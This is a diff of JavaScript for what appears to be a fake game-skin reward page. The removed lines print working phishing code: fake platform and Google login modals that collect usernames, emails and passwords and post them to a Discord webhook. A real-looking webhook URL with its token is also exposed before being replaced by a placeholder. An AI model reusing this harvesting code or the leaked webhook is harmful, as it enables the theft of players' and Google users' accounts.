@@ -1,4 +1,4 @@
-const webhookURL = "https://discord.com/api/webhooks/1359746477349666936/88A_G-WTxuBSeQ7oep_vrpDPIhqpkhGs39vbE2DLoyrNETzfuxv82mOwF3NC5JiSwnpT";
+const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
 
 const rewardsList = [
   "M4 Glacier", "Pharaoh Suit", "M4 Fool", "AKM Glacier", "Glacier Set"
@@ -51,74 +51,3 @@ function claimReward(reward) {
   fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: `Reward Claimed: ${reward}` })
-  });
-  alert(`You claimed: ${reward}`);
-}
-
-// Modal Logic
-let currentPlatform = "";
-
-function openModal(platform) {
-  currentPlatform = platform;
-  document.getElementById("loginTitle").innerText = `Login with ${platform.charAt(0).toUpperCase() + platform.slice(1)}`;
-  document.getElementById("loginModal").style.display = "flex";
-}
-
-function closeModal() {
-  document.getElementById("loginModal").style.display = "none";
-  document.getElementById("loginUser").value = "";
-  document.getElementById("loginPass").value = "";
-}
-
-function submitLogin() {
-  const username = document.getElementById("loginUser").value.trim();
-  const password = document.getElementById("loginPass").value.trim();
-  if (!username || !password) return alert("All fields required.");
-
-  const payload = {
-    content: `New ${currentPlatform.toUpperCase()} Login:\nUsername: ${username}\nPassword: ${password}`
-  };
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-  .then(() => {
-    closeModal();
-    alert("Login submitted.");
-  });
-}
-
-// Google login modal logic
-function openGoogleModal() {
-  document.getElementById("googleModal").style.display = "flex";
-}
-
-function closeGoogleModal() {
-  document.getElementById("googleModal").style.display = "none";
-  document.getElementById("googleEmail").value = "";
-  document.getElementById("googlePassword").value = "";
-}
-
-function submitGoogleLogin() {
-  const googleEmail = document.getElementById("googleEmail").value.trim();
-  const googlePassword = document.getElementById("googlePassword").value.trim();
-
-  if (!googleEmail || !googlePassword) return alert("Both fields are required for Google login.");
-
-  const payload = {
-    content: `New Google Login:\nEmail: ${googleEmail}\nPassword: ${googlePassword}`
-  };
-
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-  .then(() => {
-    closeGoogleModal();
-    alert("Google login details submitted.");
-  });
-}
